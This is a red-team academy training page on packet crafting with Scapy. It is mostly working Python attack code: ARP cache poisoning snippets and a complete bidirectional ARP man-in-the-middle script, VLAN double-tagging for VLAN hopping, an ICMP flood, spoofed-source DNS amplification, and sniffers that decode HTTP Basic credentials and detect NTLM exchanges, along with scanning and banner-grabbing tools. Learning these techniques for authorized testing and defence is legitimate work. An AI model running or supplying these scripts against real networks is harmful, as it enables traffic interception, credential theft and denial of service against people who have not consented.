---
layout: training-page
title: "Packet Crafting with Scapy — Red Team Academy"
module: "Network Attacks"
tags:
  - scapy
  - packet-crafting
  - python
  - arp
  - tcp
  - vlan
  - network
page_key: "network-packet-crafting"
render_with_liquid: false
---

# Packet Crafting with Scapy

Scapy is a Python library and interactive shell that lets you construct, send, receive, and dissect network packets at any layer. It is the Swiss Army knife for custom protocol attacks, fuzzing, network testing, and building attack tooling when existing tools don't cover an edge case.

## Overview

```
Scapy capabilities:
  - Build packets by stacking protocol layers arbitrarily
  - Send at Layer 2 (sendp) or Layer 3 (send)
  - Receive and decode live traffic
  - Answer/reply to probes (sniff + respond)
  - Replay PCAP files with modifications
  - Fuzzing protocols (fuzz() wrapper)
  - Read and write PCAP files

Use cases in red teaming:
  - ARP cache poisoning (more control than arpspoof)
  - VLAN double-tagging for VLAN hopping
  - SYN scan / TCP fingerprinting without nmap
  - Custom ICMP tunneling
  - DHCPv6 starvation and rogue server
  - DNS query spoofing
  - Network fuzzing / vulnerability research
```

## Install and Launch

```bash
# Install via pip
pip3 install scapy

# Install via apt (Debian/Ubuntu)
sudo apt install python3-scapy

# Launch interactive shell (requires root for raw sockets)
sudo scapy

# Or use in a Python script
python3 my_attack.py
```

## Scapy Fundamentals

```python
# Layer stacking syntax: use / operator to stack protocols
# Each layer knows its default values — only override what you need
from scapy.all import *

# Stack layers: Ethernet / IP / TCP / Payload
pkt = Ether() / IP(dst="10.10.10.1") / TCP(dport=80) / Raw(load=b"GET / HTTP/1.0\r\n\r\n")

# Inspect defaults (show all fields and their values)
pkt.show()

# Hex dump of the packet
hexdump(pkt)

# Hex string
pkt.hexdump()

# Access specific layer
pkt[IP].dst        # "10.10.10.1"
pkt[TCP].dport     # 80

# Check if layer exists
pkt.haslayer(TCP)  # True

# Summary line
pkt.summary()
```

## Sending and Receiving Functions

```python
# send()    — Layer 3 (IP and above); handles routing automatically
# sendp()   — Layer 2 (Ethernet); you control the MAC
# sr()      — send + receive; returns (answered, unanswered)
# sr1()     — send + receive ONE reply; returns the reply packet
# srp()     — Layer 2 send + receive
# srp1()    — Layer 2 send + receive ONE reply

# send — Layer 3 (IP routing)
send(IP(dst="10.10.10.1")/ICMP())

# sendp — Layer 2 (you specify Ethernet headers)
sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="192.168.1.1"), iface="eth0")

# sr1 — send and wait for one answer (with timeout)
reply = sr1(IP(dst="10.10.10.1")/ICMP(), timeout=2, verbose=False)
if reply:
    reply.show()

# sr — send multiple, collect all answers
answered, unanswered = sr(
    IP(dst="10.10.10.1")/TCP(dport=[22,80,443,445], flags="S"),
    timeout=2, verbose=False
)

# Loop sending (arp poison / flood)
sendp(pkt, iface="eth0", inter=2, loop=1)   # send every 2 seconds, forever
sendp(pkt, iface="eth0", count=100)          # send 100 times
send(pkt, inter=0.01, count=1000)            # send 1000 times, 10ms apart
```

## ARP Operations

```python
from scapy.all import *

# ARP request — who has 192.168.1.1?
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst="192.168.1.1")
ans = srp1(pkt, timeout=2, iface="eth0", verbose=False)
if ans:
    print(f"192.168.1.1 is at {ans[ARP].hwsrc}")

# ARP scan — discover all hosts on a subnet
ans, unans = srp(
    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.0/24"),
    timeout=2, iface="eth0", verbose=False
)
for sent, received in ans:
    print(f"{received[ARP].psrc} is at {received[ARP].hwsrc}")

# ARP reply — poison target's cache
# Tell target (192.168.1.50) that 192.168.1.1 (gateway) is at attacker MAC
poison = (
    Ether(dst="aa:bb:cc:dd:ee:ff") /   # target MAC
    ARP(
        op=2,                           # op=2 = ARP reply
        pdst="192.168.1.50",            # target IP
        hwdst="aa:bb:cc:dd:ee:ff",      # target MAC
        psrc="192.168.1.1",             # IP we're claiming to be (gateway)
        hwsrc="de:ad:be:ef:00:01"       # our MAC
    )
)
sendp(poison, iface="eth0", inter=2, loop=1)

# Bidirectional ARP poison (proper MITM)
# Also poison the gateway's ARP cache (tell it victim MAC = attacker MAC)
poison_gateway = (
    Ether(dst="11:22:33:44:55:66") /   # gateway MAC
    ARP(
        op=2,
        pdst="192.168.1.1",
        hwdst="11:22:33:44:55:66",
        psrc="192.168.1.50",
        hwsrc="de:ad:be:ef:00:01"
    )
)
sendp([poison, poison_gateway], iface="eth0", inter=2, loop=1)

# Gratuitous ARP (broadcast — poisons all hosts on segment)
grat = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2, psrc="192.168.1.1",
    pdst="192.168.1.1",
    hwsrc="de:ad:be:ef:00:01"
)
sendp(grat, iface="eth0", count=5)
```

## ICMP Operations

```python
from scapy.all import *

# ICMP echo request (ping)
pkt = IP(dst="10.10.10.1") / ICMP()
reply = sr1(pkt, timeout=2, verbose=False)
if reply:
    print(f"Host up: {reply[IP].src}")

# ICMP sweep — ping multiple hosts
targets = [f"192.168.1.{i}" for i in range(1, 255)]
ans, unans = sr(
    [IP(dst=t)/ICMP() for t in targets],
    timeout=2, verbose=False
)
live_hosts = [r[IP].src for s, r in ans if ICMP in r and r[ICMP].type == 0]
print(f"Live hosts: {live_hosts}")

# ICMP with custom data (tunnel test)
pkt = IP(dst="10.10.10.1") / ICMP() / Raw(load=b"custom_payload_here")
send(pkt)

# ICMP flood (use only on authorized targets)
send(IP(dst="10.10.10.1") / ICMP(), count=1000, inter=0.001)

# ICMP type 3 (destination unreachable) — craft for testing
pkt = IP(dst="10.10.10.1") / ICMP(type=3, code=3)  # port unreachable
send(pkt)

# ICMP redirect (force target to use different gateway — rarely works on modern OS)
pkt = IP(dst="10.10.10.1") / ICMP(type=5, code=1, gw="10.10.10.99") / \
      IP(src="10.10.10.1", dst="8.8.8.8") / UDP()
send(pkt)
```

## TCP Operations

```python
from scapy.all import *

# SYN scan — one port
pkt = IP(dst="10.10.10.1") / TCP(dport=80, flags="S")
ans = sr1(pkt, timeout=2, verbose=False)
if ans and TCP in ans:
    if ans[TCP].flags == 0x12:  # SYN-ACK = open
        print("Port 80 open")
        # Send RST to cleanly close
        send(IP(dst="10.10.10.1") / TCP(dport=80, flags="R",
             seq=ans[TCP].ack))
    elif ans[TCP].flags == 0x14:  # RST-ACK = closed
        print("Port 80 closed")

# SYN scan — port range
ports = [22, 80, 443, 445, 3389, 8080, 8443]
ans, unans = sr(
    IP(dst="10.10.10.1") / TCP(dport=ports, flags="S"),
    timeout=2, verbose=False
)
for sent, received in ans:
    if received.haslayer(TCP) and received[TCP].flags == 0x12:
        print(f"Port {received[TCP].sport} open")

# Full TCP connect (completes handshake)
# Scapy is below the OS TCP stack — OS will send RST when it sees the SYN-ACK
# Workaround: use iptables to suppress OS RST
import subprocess
subprocess.run(["iptables", "-A", "OUTPUT", "-p", "tcp", "--tcp-flags",
                "RST", "RST", "-j", "DROP"])

syn = IP(dst="10.10.10.1") / TCP(dport=80, flags="S")
syn_ack = sr1(syn, timeout=2)
if syn_ack and syn_ack[TCP].flags == 0x12:
    ack = IP(dst="10.10.10.1") / TCP(
        dport=80, flags="A",
        seq=syn_ack[TCP].ack,
        ack=syn_ack[TCP].seq + 1
    )
    send(ack)
    print("TCP handshake complete")

# TCP ACK probe — firewall fingerprinting
# ACK to a closed port: RST = stateless firewall (port filtered by stateful = no response)
pkt = IP(dst="10.10.10.1") / TCP(dport=80, flags="A")
ans = sr1(pkt, timeout=2, verbose=False)
if ans:
    print(f"RST received — stateless or no firewall on port 80")
else:
    print(f"No response — stateful firewall dropping ACK")

# TCP FIN scan (evades some simple ACL-based filters)
pkt = IP(dst="10.10.10.1") / TCP(dport=80, flags="F")
ans = sr1(pkt, timeout=2, verbose=False)
# Closed port sends RST; open port (RFC 793) sends nothing

# TCP Xmas scan (FIN + PSH + URG — "Christmas tree")
pkt = IP(dst="10.10.10.1") / TCP(dport=80, flags="FPU")
ans = sr1(pkt, timeout=2, verbose=False)

# Banner grabbing via TCP
syn = IP(dst="10.10.10.1") / TCP(dport=22, flags="S")
syn_ack = sr1(syn, timeout=2)
if syn_ack:
    ack = IP(dst="10.10.10.1") / TCP(
        dport=22, flags="A",
        seq=syn_ack[TCP].ack,
        ack=syn_ack[TCP].seq + 1
    )
    send(ack)
    # Read banner
    banner = sniff(filter="src host 10.10.10.1 and tcp port 22",
                   count=1, timeout=3)
    if banner and Raw in banner[0]:
        print(banner[0][Raw].load.decode(errors="ignore"))
```

## UDP Operations

```python
from scapy.all import *

# UDP probe — generic
pkt = IP(dst="10.10.10.1") / UDP(dport=161) / Raw(load=b"\x00")
ans = sr1(pkt, timeout=2, verbose=False)
if ans:
    if ICMP in ans and ans[ICMP].type == 3:
        print("Port 161 UDP closed (ICMP unreachable)")
    else:
        print("Port 161 UDP open or filtered")

# DNS query via Scapy (to custom resolver)
pkt = IP(dst="10.10.10.1") / UDP(dport=53) / \
      DNS(rd=1, qd=DNSQR(qname="target.corp.local"))
ans = sr1(pkt, timeout=2, verbose=False)
if ans and DNS in ans:
    for i in range(ans[DNS].ancount):
        print(ans[DNS].an[i].rdata)

# SNMP get request
from scapy.all import SNMP, SNMPget, SNMPvarbind, ASN1_OID
pkt = IP(dst="10.10.10.1") / UDP(dport=161) / \
      SNMP(community="public", PDU=SNMPget(
          varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.2.1.1.1.0"))]
      ))
ans = sr1(pkt, timeout=2, verbose=False)
if ans:
    print(ans[SNMP].PDU.varbindlist[0].value)

# UDP port sweep
targets_udp = [53, 67, 69, 123, 135, 137, 161, 500]
ans, unans = sr(
    [IP(dst="10.10.10.1")/UDP(dport=p) for p in targets_udp],
    timeout=2, verbose=False
)
# Ports with no ICMP unreachable = open or filtered
```

## DNS Queries

```python
from scapy.all import *

# Direct DNS query via Scapy (bypasses OS resolver)
def dns_query(target_host, dns_server, qtype="A"):
    pkt = IP(dst=dns_server) / UDP(dport=53) / \
          DNS(rd=1, qd=DNSQR(qname=target_host, qtype=qtype))
    ans = sr1(pkt, timeout=2, verbose=False)
    if ans and DNS in ans:
        return ans[DNS]
    return None

# A record query
result = dns_query("dc01.contoso.local", "192.168.1.10")
if result:
    for i in range(result.ancount):
        print(f"A: {result.an[i].rdata}")

# MX record query
result = dns_query("contoso.local", "192.168.1.10", qtype="MX")

# ANY query (zone enumeration attempt)
result = dns_query("contoso.local", "192.168.1.10", qtype="ANY")

# Reverse lookup (PTR)
# Note: reverse the IP and append .in-addr.arpa
result = dns_query("1.1.168.192.in-addr.arpa", "192.168.1.10", qtype="PTR")

# DNS zone transfer attempt (AXFR)
pkt = IP(dst="192.168.1.10") / TCP(dport=53) / \
      DNS(rd=1, qd=DNSQR(qname="contoso.local", qtype="AXFR"))
# Note: AXFR requires TCP; Scapy TCP DNS needs manual handshake
# Use 'dig axfr @192.168.1.10 contoso.local' for simpler zone transfer

# DNS amplification probe (test if resolver allows recursion from external)
pkt = IP(dst="8.8.8.8", src="192.168.1.1") / UDP(dport=53) / \
      DNS(rd=1, qd=DNSQR(qname=".", qtype="ANY"))
send(pkt)  # if amplification works, response goes to 192.168.1.1 (spoofed src)
```

## 802.1Q VLAN Tagging

```python
from scapy.all import *

# Single-tagged frame (normal VLAN membership)
pkt = Ether() / Dot1Q(vlan=10) / IP(dst="192.168.10.1") / ICMP()
sendp(pkt, iface="eth0")

# Double-tagged frame for VLAN hopping
# Outer tag = native VLAN of trunk (stripped by first switch)
# Inner tag = target VLAN (delivered by second switch)
pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    Dot1Q(vlan=1, type=0x8100) /    # outer = native VLAN 1; type=0x8100 = 802.1Q
    Dot1Q(vlan=20) /                 # inner = target VLAN 20
    IP(dst="192.168.20.1", ttl=64) /
    ICMP()
)
sendp(pkt, iface="eth0", verbose=True)

# VLAN hop with TCP payload (trigger reverse connection from target VLAN)
pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    Dot1Q(vlan=1, type=0x8100) /
    Dot1Q(vlan=20) /
    IP(src="192.168.1.99", dst="192.168.20.5") /
    TCP(dport=445, flags="S")
)
sendp(pkt, iface="eth0", count=3)

# Sniff for VLAN-tagged frames to enumerate VLANs
sniff(iface="eth0", filter="vlan", prn=lambda p: print(f"VLAN: {p[Dot1Q].vlan}"))

# Enumerate all VLAN IDs seen on the wire
vlan_ids = set()
def capture_vlans(pkt):
    if Dot1Q in pkt:
        vlan_ids.add(pkt[Dot1Q].vlan)
        print(f"VLAN seen: {pkt[Dot1Q].vlan}")

sniff(iface="eth0", prn=capture_vlans, timeout=30)
print(f"Discovered VLANs: {sorted(vlan_ids)}")
```

## Packet Sniffing

```python
from scapy.all import sniff, TCP, UDP, IP, Raw, DNS, DNSQR

# Basic sniff — capture 10 packets
pkts = sniff(iface="eth0", count=10)
pkts.summary()

# Sniff with filter (BPF syntax)
pkts = sniff(iface="eth0", filter="tcp port 80", count=50)

# Sniff with callback function (real-time processing)
def packet_handler(pkt):
    if IP in pkt:
        print(f"{pkt[IP].src} → {pkt[IP].dst}")

sniff(iface="eth0", prn=packet_handler, filter="ip", store=False)

# HTTP credential monitor
def http_monitor(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode(errors="ignore")
        if "Authorization: Basic" in payload:
            import base64
            auth_line = [l for l in payload.split("\r\n") if "Authorization" in l][0]
            b64_cred = auth_line.split("Basic ")[1].strip()
            print(f"[HTTP BASIC] {base64.b64decode(b64_cred).decode(errors='ignore')}")
        elif "GET" in payload or "POST" in payload:
            first_line = payload.split("\r\n")[0]
            print(f"[HTTP] {pkt[IP].src} → {first_line[:100]}")

sniff(iface="eth0", prn=http_monitor, filter="tcp port 80", store=False)

# DNS query monitor — see what names are being resolved
def dns_monitor(pkt):
    if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
        if pkt[DNS].qr == 0:  # query (not response)
            qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
            print(f"[DNS QUERY] {pkt[IP].src} → {qname}")

sniff(iface="eth0", prn=dns_monitor, filter="udp port 53", store=False)

# NTLM challenge/response sniffer (captures Net-NTLMv2 material)
def ntlm_monitor(pkt):
    if pkt.haslayer(Raw):
        raw = pkt[Raw].load
        if b"NTLMSSP" in raw:
            print(f"[NTLM] {pkt[IP].src} → {pkt[IP].dst}")
            # Full capture — use PCredz for proper hash extraction

sniff(iface="eth0", prn=ntlm_monitor, filter="tcp", store=False)

# Write captured packets to PCAP
pkts = sniff(iface="eth0", count=1000, filter="tcp port 445")
wrpcap("/tmp/smb_capture.pcap", pkts)

# Read PCAP and process
pkts = rdpcap("/tmp/smb_capture.pcap")
for pkt in pkts:
    pkt.summary()
```

## Practical Attack Scripts

### Continuous ARP Poison Script

```python
#!/usr/bin/env python3
"""
Bidirectional ARP poisoning script.
Poisons victim's gateway entry and gateway's victim entry.
Enables full MITM position.
Usage: sudo python3 arp_poison.py eth0 192.168.1.50 192.168.1.1
"""
import sys
import time
import signal
from scapy.all import *

def get_mac(ip, iface="eth0"):
    """Resolve IP to MAC via ARP request."""
    ans = srp1(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        iface=iface, timeout=2, verbose=False
    )
    if ans:
        return ans[ARP].hwsrc
    return None

def poison(victim_ip, victim_mac, gateway_ip, gateway_mac, iface="eth0"):
    """Send a single round of ARP poison packets."""
    # Tell victim: gateway IP is at our MAC
    p1 = Ether(dst=victim_mac) / ARP(
        op=2, pdst=victim_ip, hwdst=victim_mac,
        psrc=gateway_ip
    )
    # Tell gateway: victim IP is at our MAC
    p2 = Ether(dst=gateway_mac) / ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac,
        psrc=victim_ip
    )
    sendp([p1, p2], iface=iface, verbose=False)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface="eth0"):
    """Restore correct ARP entries on both victim and gateway."""
    p1 = Ether(dst=victim_mac) / ARP(
        op=2, pdst=victim_ip, hwdst=victim_mac,
        psrc=gateway_ip, hwsrc=gateway_mac
    )
    p2 = Ether(dst=gateway_mac) / ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac,
        psrc=victim_ip, hwsrc=victim_mac
    )
    sendp([p1, p2], count=5, iface=iface, verbose=False)
    print("[*] ARP tables restored")

if __name__ == "__main__":
    iface, victim_ip, gateway_ip = sys.argv[1], sys.argv[2], sys.argv[3]

    print(f"[*] Resolving MACs...")
    victim_mac = get_mac(victim_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)
    print(f"[*] Victim:  {victim_ip} → {victim_mac}")
    print(f"[*] Gateway: {gateway_ip} → {gateway_mac}")

    # Enable IP forwarding
    import subprocess
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)

    def cleanup(sig, frame):
        print("\n[*] Stopping — restoring ARP...")
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    print(f"[*] Poisoning {victim_ip} ↔ {gateway_ip} (Ctrl+C to stop)")
    count = 0
    while True:
        poison(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        count += 1
        if count % 10 == 0:
            print(f"[*] Sent {count * 2} poison packets")
        time.sleep(2)
```

### Network Host Sweep (ICMP + ARP Combined)

```python
#!/usr/bin/env python3
"""
Dual-method host discovery: ARP (reliable on local segment)
+ ICMP (works across routed segments).
Usage: sudo python3 sweep.py 192.168.1.0/24 eth0
"""
import sys
from scapy.all import *

def arp_sweep(subnet, iface="eth0"):
    """ARP-based host discovery — reliable on local L2 segment."""
    print(f"[*] ARP sweep: {subnet}")
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
        iface=iface, timeout=3, verbose=False
    )
    results = {}
    for sent, received in ans:
        results[received[ARP].psrc] = received[ARP].hwsrc
        print(f"  [ARP] {received[ARP].psrc}  ({received[ARP].hwsrc})")
    return results

def icmp_sweep(subnet):
    """ICMP-based host discovery — works across routed segments."""
    print(f"[*] ICMP sweep: {subnet}")
    ans, _ = sr(
        IP(dst=subnet) / ICMP(),
        timeout=3, verbose=False
    )
    live = []
    for sent, received in ans:
        if ICMP in received and received[ICMP].type == 0:
            live.append(received[IP].src)
            print(f"  [ICMP] {received[IP].src}")
    return live

if __name__ == "__main__":
    subnet = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.0/24"
    iface = sys.argv[2] if len(sys.argv) > 2 else "eth0"

    arp_results = arp_sweep(subnet, iface)
    icmp_results = icmp_sweep(subnet)

    all_hosts = set(arp_results.keys()) | set(icmp_results)
    print(f"\n[+] Total live hosts: {len(all_hosts)}")
    for host in sorted(all_hosts):
        mac = arp_results.get(host, "unknown")
        print(f"  {host:<20} {mac}")
```

### TCP Banner Grabber

```python
#!/usr/bin/env python3
"""
TCP banner grabber using Scapy.
Completes handshake and reads initial server banner.
Usage: sudo python3 banner.py 10.10.10.1 22,80,443,21,25
"""
import sys
import subprocess
from scapy.all import *

def grab_banner(target_ip, port, timeout=3):
    """Attempt TCP banner grab on a single port."""
    # Suppress OS RST (OS doesn't know about our raw socket SYN)
    subprocess.run(
        ["iptables", "-A", "OUTPUT", "-p", "tcp",
         "--tcp-flags", "RST", "RST",
         "--dport", str(port), "-j", "DROP"],
        capture_output=True
    )
    try:
        syn = IP(dst=target_ip) / TCP(dport=port, flags="S", seq=1000)
        syn_ack = sr1(syn, timeout=timeout, verbose=False)

        if not syn_ack or not syn_ack.haslayer(TCP):
            return None
        if syn_ack[TCP].flags != 0x12:  # Not SYN-ACK
            return None

        # Complete handshake
        ack = IP(dst=target_ip) / TCP(
            dport=port, flags="A",
            seq=syn_ack[TCP].ack,
            ack=syn_ack[TCP].seq + 1
        )
        send(ack, verbose=False)

        # Listen for banner
        banner_pkt = sniff(
            filter=f"src host {target_ip} and tcp src port {port}",
            count=2, timeout=timeout
        )
        for pkt in banner_pkt:
            if Raw in pkt:
                return pkt[Raw].load.decode(errors="ignore").strip()[:200]
        return "[open — no banner]"

    finally:
        subprocess.run(
            ["iptables", "-D", "OUTPUT", "-p", "tcp",
             "--tcp-flags", "RST", "RST",
             "--dport", str(port), "-j", "DROP"],
            capture_output=True
        )

if __name__ == "__main__":
    target = sys.argv[1]
    ports = [int(p) for p in sys.argv[2].split(",")]

    print(f"[*] Banner grabbing {target} on ports {ports}")
    for port in ports:
        banner = grab_banner(target, port)
        if banner:
            print(f"  [{port}] {banner}")
        else:
            print(f"  [{port}] closed or filtered")
```

## Resources

- Scapy documentation — `scapy.readthedocs.io`
- Scapy GitHub — `github.com/secdev/scapy`
- Scapy interactive tutorial — `scapy.net/doc/interactive_tutorial.html`
- MITRE T1040 — Network Sniffing — `attack.mitre.org/techniques/T1040/`
- MITRE T1557.002 — ARP Cache Poisoning — `attack.mitre.org/techniques/T1557/002/`
- MITRE T1599 — Network Boundary Bridging (VLAN) — `attack.mitre.org/techniques/T1599/`
